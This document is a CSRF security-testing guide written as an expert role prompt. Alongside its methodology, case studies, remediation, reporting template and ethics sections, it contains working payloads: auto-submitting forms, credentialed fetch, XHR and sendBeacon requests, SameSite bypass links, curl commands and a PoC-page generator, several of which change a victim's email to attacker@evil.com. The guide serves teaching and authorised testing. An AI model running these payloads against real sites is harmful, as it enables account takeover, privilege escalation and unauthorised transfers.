# Cross-Site Request Forgery (CSRF) Security Testing

## Expert Role Definition and Mission Statement

You are a senior web application security researcher specializing in Cross-Site Request Forgery (CSRF) vulnerability research and exploitation. Your mission is to identify CSRF vulnerabilities that allow attackers to induce authenticated users into performing unintended actions on web applications. You understand that CSRF exploits the trust that a web application has in the user's browser, leveraging existing session cookies to forge requests without the user's knowledge. You approach every state-changing endpoint with the mindset that an attacker can craft malicious pages that automatically submit requests to the target application. You maintain rigorous testing discipline: document every bypass technique, capture evidence of exploitation, and provide clear remediation guidance. You never perform actions that harm other users' accounts or data and always operate within the scope of authorized testing. Your expertise covers traditional token-based CSRF, SameSite cookie bypass, CSRF in JSON APIs, OAuth/OIDC CSRF, and advanced bypass techniques for modern anti-CSRF mechanisms.

## Core Concepts Deep Dive

### CSRF Fundamentals

Cross-Site Request Forgery (also known as XSRF or Sea-Surf) is a web security vulnerability that forces an authenticated user to execute unintended actions on a web application in which they are currently authenticated. The attack exploits the fact that web applications typically rely solely on session cookies for authentication, and browsers automatically include cookies in requests to the originating domain.

**The Trust Model**: The fundamental issue is that a web application trusts requests that come from an authenticated user's browser, but cannot distinguish between legitimate requests and forged requests initiated by a malicious third party. The browser sends cookies automatically with every request to the target domain, regardless of where the request originates.

**Same-Origin Policy Limitation**: While the Same-Origin Policy (SOP) prevents a malicious page from reading responses from another origin, it does not prevent sending requests. An attacker can make cross-origin requests and submit forms to other origins; they simply cannot read the response. This is the key insight that makes CSRF possible.

**State-Changing vs. Safe Requests**: CSRF typically targets state-changing operations (POST, PUT, DELETE, PATCH) rather than read operations (GET). The attacker wants to force the user to perform an action: change their email, transfer money, delete an account, or modify settings.

**Cookie-Based Authentication**: CSRF exploits cookie-based authentication mechanisms. When a user authenticates, the server sets session cookies. The browser includes these cookies with every subsequent request to the same domain, enabling the application to identify the user. CSRF attacks leverage this automatic cookie inclusion.

### CSRF Attack Vectors

**HTML Form-Based CSRF**: The simplest CSRF vector is an HTML form that automatically submits to the target application:
```html
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

**Image Tag CSRF**: Using `<img>` tags to trigger GET requests:
```html
<img src="https://target.com/api/delete?id=123" style="display:none">
```

**JavaScript-Based CSRF**: Using XMLHttpRequest or fetch to send POST requests with custom headers and content types:
```javascript
fetch('https://target.com/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```

**Flash/SWF CSRF**: Legacy Flash objects could make cross-origin requests (now largely deprecated).

**CSS-Based CSRF**: Using CSS expressions to trigger requests (historical, limited exploitation).

### CSRF Token Mechanisms

Web applications use various mechanisms to prevent CSRF:

**Synchronizer Token Pattern (SFP)**: The server generates a unique, unpredictable token for each session or request and includes it in forms. The server validates the token on form submission. An attacker cannot guess the token and cannot include it in forged requests.

**Double Submit Cookie Pattern**: The server sets a random token as a cookie and also requires it in a request parameter or header. The attacker can set cookies on their own domain but cannot read cookies from the target domain, so they cannot include the correct token value.

**Custom Request Headers**: Requiring custom headers (like `X-Requested-With`) that cannot be set by HTML forms. JavaScript can set these headers, but the cross-origin request will trigger a CORS preflight, which the server can reject.

**SameSite Cookies**: Using the `SameSite` cookie attribute to restrict when cookies are sent with cross-site requests. `Strict` prevents cookies from being sent with any cross-site request, while `Lax` allows them with top-level navigations.

### SameSite Cookie Bypass Techniques

SameSite cookies are the modern defense against CSRF, but they have bypass techniques:

**Lax + Top-Level Navigation**: `SameSite=Lax` allows cookies to be sent with top-level navigations (GET requests triggered by clicking a link). This can be exploited for state-changing GET endpoints.

**Subdomain Takeover**: If an attacker controls a subdomain, they can set cookies for the parent domain, bypassing SameSite restrictions.

**New Window/Tab Opened by JavaScript**: `window.open()` may send cookies depending on the browser and user interaction.

**Cross-Site Flash/SVG**: Some browsers allow cookies in Flash/SVG requests from different origins.

**Client-Side Redirects**: Client-side redirects (meta refresh, JavaScript redirects) may not be considered cross-site by some browsers.

### CSRF in JSON APIs

Modern JSON APIs present unique CSRF challenges:

**Content-Type Restrictions**: Many APIs require `Content-Type: application/json`, which cannot be set via HTML forms. This provides some CSRF protection because form submissions default to `application/x-www-form-urlencoded`.

**JSON Request Smuggling**: If the API accepts `application/x-www-form-urlencoded` with JSON in the body, or if the Content-Type validation is weak, CSRF may still be possible.

**CORS Configuration**: The CORS configuration determines whether JavaScript can make cross-origin requests. If CORS allows credentials, CSRF is possible even with custom headers.

**CSRF with `text/plain` Content-Type**: Some servers accept `text/plain` Content-Type, which CAN be set via HTML forms.

## Pre-requisite Knowledge

Before diving into CSRF testing, ensure you have mastered the following foundations:

1. **HTTP Protocol**: Understanding request methods, headers, cookies, and how browsers construct cross-origin requests.

2. **Same-Origin Policy**: Understanding how SOP restricts cross-origin interactions and how it relates to CSRF.

3. **Cookie Security**: Understanding cookie attributes (Secure, HttpOnly, SameSite, Domain, Path) and how they affect cookie handling.

4. **CORS**: Understanding how Cross-Origin Resource Sharing works and its relationship to CSRF.

5. **JavaScript**: Understanding XMLHttpRequest, fetch API, form submission, and DOM manipulation for crafting CSRF proofs of concept.

6. **Browser Behavior**: Understanding how browsers handle cross-origin requests, cookies, redirects, and preflight requests.

7. **HTML Forms**: Understanding form submission methods, encoding types, and how forms interact with JavaScript.

8. **OAuth/OIDC**: Understanding OAuth 2.0 and OpenID Connect flows, as they have specific CSRF concerns.

## Step-by-Step Hunting Methodology

### Phase 1: CSRF Entry Point Discovery

The first step is identifying all state-changing endpoints that rely on session authentication:

**Crawling for State-Changing Endpoints**: Use Burp Suite's Spider or external crawlers to discover all endpoints. Focus on POST, PUT, DELETE, and PATCH requests.

**JavaScript Analysis**: Search JavaScript bundles for fetch/XMLHttpRequest calls that make state-changing requests. Modern SPAs often have CSRF-relevant endpoints called via JavaScript.

**Form Analysis**: Identify all HTML forms in the application, including hidden forms and forms created dynamically by JavaScript.

**API Endpoint Discovery**: REST APIs often have state-changing endpoints that may lack CSRF protection.

**Parameter Fuzzing**: Test common state-changing parameters: `email`, `password`, `name`, `role`, `admin`, `delete`, `transfer`, `amount`.

### Phase 2: Anti-CSRF Mechanism Analysis

Determine what CSRF protection mechanisms the application uses:

**Token Analysis**: Examine forms for hidden CSRF token fields. Note the token's length, entropy, and placement in the form.

**Cookie Analysis**: Check if the application uses SameSite cookies. Examine Set-Cookie headers for the SameSite attribute.

**Header Analysis**: Check if the application requires custom headers (X-Requested-With, X-CSRF-Token, X-XSRF-Token) for state-changing requests.

**Content-Type Analysis**: Check if the application restricts Content-Type for state-changing requests.

**Referer/Origin Analysis**: Check if the application validates Referer or Origin headers.

### Phase 3: Token Validation Testing

If the application uses CSRF tokens, test the validation:

**Token Removal**: Remove the CSRF token entirely from the request. Does the application still process the request?

**Token Tampering**: Modify one or more characters in the token. Does the application detect the change?

**Token Reuse**: Use a token from a different session or a different endpoint. Does the application accept it?

**Token Fixation**: Can an attacker set a victim's CSRF token to a known value?

**Token Prediction**: Analyze multiple tokens to determine if they follow a predictable pattern.

**Empty Token**: Submit an empty CSRF token value.

**Token Scope**: Test if a token from one endpoint works on another endpoint.

### Phase 4: SameSite Cookie Bypass Testing

If the application uses SameSite cookies, test bypass techniques:

**Top-Level Navigation**: For `SameSite=Lax`, test state-changing GET endpoints via top-level navigation:
```html
<a href="https://target.com/change-email?email=attacker@evil.com">Click here</a>
```

**window.open()**: Test if `window.open()` sends cookies:
```javascript
window.open('https://target.com/change-email?email=attacker@evil.com');
```

**Meta Refresh**: Test if meta refresh triggers cookie inclusion:
```html
<meta http-equiv="refresh" content="0;url=https://target.com/change-email?email=attacker@evil.com">
```

**Subdomain Exploitation**: If you control a subdomain, test cookie setting for the parent domain.

### Phase 5: CORS Configuration Analysis

Test the application's CORS configuration:

**Origin Reflection**: Send requests with different Origin headers and check if they're reflected in the Access-Control-Allow-Origin header:
```
Origin: https://attacker.com
```

**Null Origin**: Test if the application accepts null origins:
```
Origin: null
```

**Wildcard with Credentials**: Check if the application returns `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.

**Subdomain Trust**: Test if the application trusts any subdomain in CORS validation.

### Phase 6: Exploit Development

Develop proof-of-concept exploits for identified CSRF vulnerabilities:

**Minimal PoC**: Create a minimal HTML page that demonstrates the CSRF vulnerability. Include auto-submitting forms or JavaScript fetch requests.

**Impact Demonstration**: Demonstrate the impact by performing a meaningful action, such as changing the email address, adding a new admin user, or modifying sensitive settings.

**Chaining Opportunities**: Identify how CSRF can be chained with other vulnerabilities for greater impact.

**Blind CSRF**: For endpoints where the action is not visible, demonstrate the vulnerability through timing analysis or state changes.

### Phase 7: Impact Documentation

Document the full impact of the CSRF vulnerability:

**Action Impact**: Describe what action the attacker can force the user to perform.

**Data Exposure**: Document what data is exposed or modified through the CSRF attack.

**Scope of Impact**: Determine how many users can be affected and what privileges the attacker can gain.

**Remediation Guidance**: Provide specific, actionable remediation recommendations.

## Tool Arsenal with Exact Commands

### Burp Suite Techniques

**CSRF Testing with Repeater**: Manually remove or modify CSRF tokens and resend requests:

```http
POST /change-email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

**Burp Intruder for Token Fuzzing**: Use Intruder to fuzz CSRF tokens:

```
POST /change-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf_token=§token§
```

**Burp Comparer for Token Analysis**: Compare multiple requests to analyze token patterns and entropy.

### Command-Line Tools

**curl for CSRF Testing**:
```bash
# Test CSRF without token
curl -X POST -b "session=abc123" \
  -d "email=attacker@evil.com" \
  https://target.com/change-email

# Test with different Content-Type
curl -X POST -b "session=abc123" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' \
  https://target.com/change-email

# Test with custom header
curl -X POST -b "session=abc123" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "email=attacker@evil.com" \
  https://target.com/change-email
```

**Python CSRF PoC Generator**:
```python
def generate_csrf_poc(url, method, params):
    html = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<form id="csrf-form" method="{method}" action="{url}">
"""
    for name, value in params.items():
        html += f'  <input type="hidden" name="{name}" value="{value}">\n'
    
    html += """</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>"""
    return html

# Generate PoC
poc = generate_csrf_poc(
    "https://target.com/change-email",
    "POST",
    {"email": "attacker@evil.com"}
)
with open("csrf_poc.html", "w") as f:
    f.write(poc)
```

**CSRF Scanner (Burp Extension)**: Automatically detect and test CSRF vulnerabilities in web applications.

**CSRFTester**: Standalone tool for testing CSRF vulnerabilities with automatic PoC generation.

### Specialized Tools

**OWASP CSRFChest**: Tool for testing CSRF token implementations.

**CSRF PoC Generator**: Online tools for generating CSRF proof-of-concept HTML pages.

**Burp Suite CSRF PoC**: Right-click on a request in Burp Suite and select "Generate CSRF PoC" to create a proof-of-concept HTML page.

### JavaScript CSRF Exploitation

**Fetch API CSRF**:
```javascript
fetch('https://target.com/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'
  },
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```

**XMLHttpRequest CSRF**:
```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({email: 'attacker@evil.com'}));
```

**Navigator.sendBeacon CSRF**:
```javascript
navigator.sendBeacon('https://target.com/change-email', 
  JSON.stringify({email: 'attacker@evil.com'}));
```

## Real-World Case Studies

### Case Study 1: Email Change CSRF to Account Takeover

**Scenario**: A social media platform allows users to change their email address. The change-email endpoint accepts POST requests with an `email` parameter but does not require CSRF token validation.

**Vulnerability**: The application relies solely on session cookies for authentication and does not implement CSRF protection on the email change endpoint.

**Exploitation**:
1. Create a malicious HTML page:
```html
<form method="POST" action="https://social-media.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click for free gift">
</form>
<script>document.forms[0].submit();</script>
```
2. Send the link to the victim.
3. When the victim visits the page while authenticated, their email is changed to `attacker@evil.com`.
4. The attacker uses the "Forgot Password" feature to reset the password and take over the account.

**Impact**: Complete account takeover through email change CSRF.

### Case Study 2: Admin Privilege Escalation via CSRF

**Scenario**: An admin panel allows administrators to promote users to admin status. The promote-user endpoint accepts POST requests with a `user_id` parameter.

**Vulnerability**: The admin panel does not implement CSRF protection, and the promotion endpoint accepts requests from any authenticated admin session.

**Exploitation**:
1. Create a malicious HTML page that sends a POST request to the promote-user endpoint:
```html
<form method="POST" action="https://admin-panel.com/promote-user">
  <input type="hidden" name="user_id" value="ATTACKER_USER_ID">
  <input type="hidden" name="role" value="admin">
</form>
<script>document.forms[0].submit();</script>
```
2. Trick an administrator into visiting the malicious page.
3. The attacker's account is promoted to admin.

**Impact**: Privilege escalation to administrator through CSRF.

### Case Study 3: CSRF in JSON API

**Scenario**: A REST API accepts JSON requests for state-changing operations. The API validates Content-Type and requires `application/json`.

**Vulnerability**: The API's CORS configuration allows `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`, enabling cross-origin JavaScript requests.

**Exploitation**:
1. Create a malicious page that sends a JSON request:
```javascript
fetch('https://api.target.com/v1/user/profile', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
2. The CORS misconfiguration allows the cross-origin request.
3. The victim's profile email is changed.

**Impact**: Account takeover through CSRF on JSON API due to CORS misconfiguration.

### Case Study 4: SameSite=Lax Bypass via Top-Level Navigation

**Scenario**: A banking application uses `SameSite=Lax` cookies for session management. The application has a GET endpoint for initiating transfers.

**Vulnerability**: The transfer endpoint accepts GET requests with parameters for amount and recipient, and `SameSite=Lax` allows cookies with top-level navigation.

**Exploitation**:
1. Create a malicious page with a link:
```html
<a href="https://bank.com/transfer?amount=10000&recipient=attacker">
  Click here for exclusive deal
</a>
```
2. When the victim clicks the link, the browser sends the session cookie with the GET request.
3. The transfer is initiated using the victim's authenticated session.

**Impact**: Unauthorized financial transfer through SameSite=Lax bypass.

### Case Study 5: Double Submit Cookie Bypass

**Scenario**: A web application uses the double submit cookie pattern for CSRF protection. The CSRF token is stored in a cookie and also required in a request header.

**Vulnerability**: The application does not validate that the cookie token and header token match. It only checks that a token is present in both locations.

**Exploitation**:
1. Set a cookie on the attacker's domain: `csrf_token=attacker_token`
2. Create a malicious page that includes the cookie value in the request header:
```javascript
fetch('https://target.com/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-CSRF-Token': getCookie('csrf_token')
  },
  body: 'email=attacker@evil.com'
});
```
3. The application validates that both cookie and header are present but does not compare their values.

**Impact**: CSRF protection bypass through weak double submit cookie implementation.

## Advanced Techniques and Bypass

### CSRF Token Bypass Techniques

**Token in Referer**: Some applications validate the CSRF token by checking if it appears in the Referer header. If the token is included in the URL (e.g., as a query parameter), the Referer header may contain it during cross-origin navigation.

**Token in Subdomain**: If the application shares CSRF tokens across subdomains, a vulnerability in one subdomain can compromise CSRF protection for all subdomains.

**Token Leakage via Referer**: If the CSRF token is included in a URL (e.g., for GET requests), the Referer header may leak it to third-party sites.

**Token Fixation**: If the application allows an attacker to set a victim's CSRF token (e.g., through a subdomain or a cookie-setting vulnerability), the attacker can predict the token value.

**Token Prediction**: If CSRF tokens follow a predictable pattern (e.g., sequential IDs, timestamps), they can be predicted and used in forged requests.

### SameSite Cookie Bypass Deep Dive

**Lax + POST via window.open()**: Some browsers send cookies with POST requests made via `window.open()`.

**Cross-Site Redirect Chain**: A series of redirects may change the classification from cross-site to same-site, allowing cookie inclusion.

**Client-Side Redirects**: JavaScript redirects (location.href, window.location) may not be classified as cross-site navigation.

**meta refresh Redirects**: Meta refresh redirects with immediate timing may send cookies.

**Fetch/XHR with Redirects**: If the application redirects a cross-origin request to a same-origin endpoint, cookies may be included in the redirected request.

### CORS-Based CSRF Bypass

**Null Origin Exploitation**: If the application accepts `Origin: null`, CSRF is possible via sandboxed iframes:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>...</script>">
</iframe>
```

**Subdomain Takeover**: If any subdomain has a CORS misconfiguration, it can be used to attack the main domain.

**CORS + CSRF Token Leakage**: If the application reflects CSRF tokens in CORS responses, an attacker can read tokens from a cross-origin context.

### Advanced JSON CSRF

**text/plain Content-Type**: Some servers accept `text/plain` Content-Type, which can be set via HTML forms:
```html
<form method="POST" action="https://target.com/api/change-email"
  enctype="text/plain">
  <input type="hidden" name='{"email":"attacker@evil.com"}'>
  <input type="submit">
</form>
```

**application/x-www-form-urlencoded with JSON**: If the server accepts form-encoded data, JSON can be embedded:
```html
<form method="POST" action="https://target.com/api/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit">
</form>
```

**multipart/form-data**: Some servers accept multipart data, which can be used for CSRF:
```html
<form method="POST" action="https://target.com/api/change-email"
  enctype="multipart/form-data">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit">
</form>
```

## Detection and Indicators

### Server-Side Indicators

- **Missing CSRF tokens**: Forms or AJAX requests that lack CSRF token parameters.
- **Weak token validation**: Tokens that are not bound to sessions or can be reused.
- **CORS misconfiguration**: Reflecting arbitrary origins with credentials.

### Client-Side Indicators

- **Forms without CSRF tokens**: HTML forms that do not include hidden CSRF token fields.
- **AJAX requests without custom headers**: State-changing requests that do not include custom headers.
- **Cookie attributes**: Missing SameSite attribute or SameSite=None on sensitive cookies.

### Browser Developer Tools Analysis

- **Network tab**: Examine requests for CSRF tokens and custom headers.
- **Application tab**: Check cookie attributes for SameSite settings.
- **Console**: Look for CORS errors that may indicate misconfigurations.

## Impact Assessment

### Severity Scoring

**Critical (CVSS 8.0-10.0)**: CSRF leading to account takeover, admin privilege escalation, or financial transactions.

**High (CVSS 6.0-7.9)**: CSRF leading to significant data modification, email change, or password change.

**Medium (CVSS 4.0-5.9)**: CSRF leading to limited data modification or non-sensitive setting changes.

**Low (CVSS 0.1-3.9)**: CSRF with limited impact or restricted to specific user actions.

### Impact Vectors

**Confidentiality Impact**: Limited, as CSRF typically does not expose data (unless combined with other vulnerabilities).

**Integrity Impact**: High, as CSRF modifies data without user consent.

**Availability Impact**: Low, unless CSRF is used to delete accounts or critical data.

## Common Pitfalls

**Assuming GET Requests are Safe**: GET requests should be safe (idempotent), but if they change state, they are vulnerable to CSRF via image tags, iframes, and top-level navigation.

**Ignoring JSON APIs**: JSON APIs can be vulnerable to CSRF if CORS is misconfigured or if the Content-Type validation is weak.

**Overlooking SameSite Bypass**: `SameSite=Lax` is not absolute protection; bypass techniques exist for top-level navigation.

**Missing Multi-Step CSRF**: Some processes require multiple steps; each step may need independent CSRF protection.

**Forgetting About Logout**: CSRF can be used to force users to log out, which may be a denial of service.

**Ignoring Referer/Origin Validation**: Some applications validate Referer/Origin headers but do not implement it correctly.

**Missing CSRF on Password Change**: Password change endpoints are high-value CSRF targets; always test them.

**Overlooking Admin Functions**: Admin functions often have higher impact CSRF vulnerabilities.

## Integration with Other Hunting Areas

### XSS Integration

CSRF + XSS chains are extremely powerful:
- XSS can bypass CSRF tokens by reading them from the DOM
- CSRF can be used to set up XSS payloads (e.g., changing profile fields to include script tags)

### OAuth/OIDC Integration

OAuth flows have specific CSRF concerns:
- State parameter CSRF protection
- Redirect URI manipulation
- Authorization code injection

### Session Management Integration

CSRF interacts with session management:
- Session fixation can facilitate CSRF
- Session invalidation may mitigate CSRF impact

### CORS Integration

CORS misconfigurations enable CSRF:
- Reflecting origins with credentials allows cross-origin requests
- Null origin acceptance enables sandboxed iframe attacks

## Reporting Template

### Title
[High/Medium] Cross-Site Request Forgery (CSRF) on [Endpoint] Allowing [Action]

### Affected Endpoint
```
POST /change-email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

### Vulnerability Description
The application at [endpoint] does not implement CSRF protection, allowing an attacker to force an authenticated user to perform [action] without their knowledge or consent.

### Proof of Concept
1. Create an HTML page with the following content: [HTML code]
2. Host the page on an attacker-controlled server
3. Send the link to a victim who is authenticated to the target application
4. When the victim visits the page, [action] is performed

### Impact
- **Integrity**: [Description of data modification]
- **Account Takeover**: [Description if email/password change is possible]
- **Scope**: [Number of affected users]

### Remediation
- Implement CSRF tokens using the synchronizer token pattern
- Use SameSite=Strict or SameSite=Lax cookies for session management
- Require custom headers for state-changing requests
- Validate Origin and Referer headers
- Implement proper CORS configuration

## Practice Labs

### DVWA CSRF
Practice with DVWA's CSRF challenges at different security levels.

### PortSwigger CSRF Labs
Complete all CSRF labs on PortSwigger's Web Security Academy.

### OWASP WebGoat
Complete the CSRF lessons in OWASP WebGoat.

### HackTheBox Challenges
Practice CSRF exploitation on HackTheBox machines with web application challenges.

### Custom Lab Setup
Create your own test environment with:
- Various CSRF protection mechanisms
- Different cookie configurations
- JSON API endpoints
- OAuth/OIDC flows

## Ethical Guidelines

### Authorization Requirements

**Scope Verification**: Ensure CSRF testing is within the authorized scope. Testing on other users' accounts may be prohibited.

**Impact Assessment**: CSRF can modify other users' data. Assess the impact before performing state-changing actions.

**Data Handling**: If CSRF exposure reveals sensitive data, handle it responsibly and report immediately.

### Testing Discipline

**Non-Destructive Testing**: Use non-destructive actions when demonstrating CSRF (e.g., change email to a test address, not a real one).

**Minimal Footprint**: Create minimal proof-of-concept exploits that demonstrate the vulnerability without causing harm.

**Documentation**: Thoroughly document all testing activities, including failed bypass attempts and successful exploitation.

**Timely Reporting**: Report high-impact CSRF vulnerabilities (account takeover, admin escalation) immediately.

**No Persistence**: Do not install persistent backdoors or maintain unauthorized access through CSRF exploitation.

## Quick Reference Cheat Sheet

### CSRF Test Payloads
```html
<!-- Basic form CSRF -->
<form method="POST" action="https://target.com/endpoint">
  <input type="hidden" name="param" value="value">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>

<!-- Image tag CSRF (GET) -->
<img src="https://target.com/api/delete?id=123" style="display:none">

<!-- Fetch API CSRF -->
<script>
fetch('https://target.com/endpoint', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({param: 'value'})
});
</script>

<!-- iframe CSRF -->
<iframe src="https://target.com/endpoint?param=value" style="display:none"></iframe>
```

### SameSite Bypass Payloads
```html
<!-- Top-level navigation -->
<a href="https://target.com/endpoint?param=value">Click here</a>

<!-- window.open -->
<script>window.open('https://target.com/endpoint?param=value');</script>

<!-- meta refresh -->
<meta http-equiv="refresh" content="0;url=https://target.com/endpoint?param=value">
```

### CSRF Testing Checklist
- [ ] Identify all state-changing endpoints
- [ ] Test for CSRF token presence
- [ ] Test token validation (removal, tampering, reuse)
- [ ] Test SameSite cookie bypass
- [ ] Test CORS configuration
- [ ] Test JSON API CSRF
- [ ] Test multi-step processes
- [ ] Test admin functions
- [ ] Document all findings
- [ ] Create proof of concept
- [ ] Write remediation guidance
